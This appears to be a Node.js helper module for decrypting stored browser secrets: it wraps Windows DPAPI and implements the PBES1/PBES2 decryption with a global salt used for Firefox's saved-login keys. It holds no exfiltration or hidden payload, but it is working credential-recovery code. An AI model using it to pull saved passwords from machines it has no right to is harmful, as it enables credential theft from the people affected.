const forge = require('node-forge');
const crypto = require('crypto');

const { Dpapi } = require('@primno/dpapi');

const DPAPI = (encryptedData, entropy, scope) => {
    if (!encryptedData || !encryptedData.length) {
        return new Error("No data provided to decrypt");
    };

    try {
        return Dpapi.unprotectData(encryptedData, entropy, scope);
    } catch (err) {
        return null;
    }
};

const DecryptedData = (encryptedData, iv, masterKey, algorithm) => {
    const decipher = forge.cipher.createDecipher(algorithm, masterKey);
    decipher.start({ iv });
    decipher.update(forge.util.createBuffer(encryptedData));

    const success = decipher.finish();

    return success ? decipher.output : null;
};

const HashWithSHA1 = (input) => {
    const sha1Hash = forge.md.sha1.create();
    sha1Hash.update(input, 'raw');

    return sha1Hash.digest().data;
};

const PadingArrayToLength = (array, targetLength) => {
    if (array.length >= targetLength) return array;

    const paddedArray = new Uint8Array(targetLength);
    paddedArray.set(array);

    return paddedArray;
};

const ComputeHMACSHA1 = (input, secretKey) => {
    const hmacInstance = forge.hmac.create();
    hmacInstance.start('sha1', secretKey);
    hmacInstance.update(input, 'raw');

    return hmacInstance.digest().data;
};

const BufferToByteString = (buffer) => {
    return String.fromCharCode(...new Uint8Array(buffer));
};

const StringToUtf8ByteString = (str) => {
    return forge.util.encodeUtf8(str);
};

const StringToUint8Array = (str) => {
    return Uint8Array.from(str, char => char.charCodeAt(0));
};

const DecodeB64ASN1Data = (code64) => {
    const ASN1 = forge.asn1.fromDer(forge.util.decode64(code64)).value;

    return {
        iv: ASN1[1].value[1].value,
        data: ASN1[2].value
    };
};

const DecryptUsingPBES1 = (decodedSequence, password, globalSalt) => {
    const encryptedData = decodedSequence[1].value;
    const salt = decodedSequence[0].value[1].value[0].value;
    const hashedPassword = HashWithSHA1(globalSalt + password);
    const paddedSalt = BufferToByteString(PadingArrayToLength(StringToUint8Array(salt), 20).buffer);

    const combinedHash = HashWithSHA1(hashedPassword + salt);
    const key1 = ComputeHMACSHA1(paddedSalt + salt, combinedHash);
    const temporaryKey = ComputeHMACSHA1(paddedSalt, combinedHash);
    const key2 = ComputeHMACSHA1(temporaryKey + salt, combinedHash);
    const combinedKey = key1 + key2;

    const keyBuffer = forge.util.createBuffer(combinedKey);
    const key = keyBuffer.getBytes(24);
    const iv = keyBuffer.getBytes(8);

    return DecryptedData(encryptedData, iv, key, '3DES-CBC');
};

const DecryptUsingPBES2 = (decodedSequence, password, globalSalt) => {
    const encryptedData = decodedSequence[1].value;

    const pbkdf2Parameters = decodedSequence[0].value[1].value[0].value[1].value;
    const salt = pbkdf2Parameters[0].value;
    const iterations = pbkdf2Parameters[1].value.charCodeAt(0);

    const iv = `\x04\x0e${decodedSequence[0].value[1].value[1].value[1].value}`;

    const hashedKey = HashWithSHA1(globalSalt + password);
    const derivedKey = forge.pkcs5.pbkdf2(hashedKey, salt, iterations, 32, forge.md.sha256.create());

    return DecryptedData(encryptedData, iv, derivedKey, 'AES-CBC');
};

const PBESDecrypt = (decodedSequence, password, globalSalt) => {
    if (decodedSequence[0].value[1].value[0].value[1].value) {
        return DecryptUsingPBES2(decodedSequence, password, globalSalt);
    };

    return DecryptUsingPBES1(decodedSequence, password, globalSalt);
};

const DecryptWithPBES = (encryptedData, passwordBytes, salt) => {
    const asn1Data = forge.asn1.fromDer(encryptedData);
    
    return PBESDecrypt(asn1Data.value, passwordBytes, salt);
};

module.exports = {
    DPAPI,
    StringToUtf8ByteString,
    DecryptWithPBES,
    BufferToByteString,
    DecodeB64ASN1Data,
    DecryptedData
};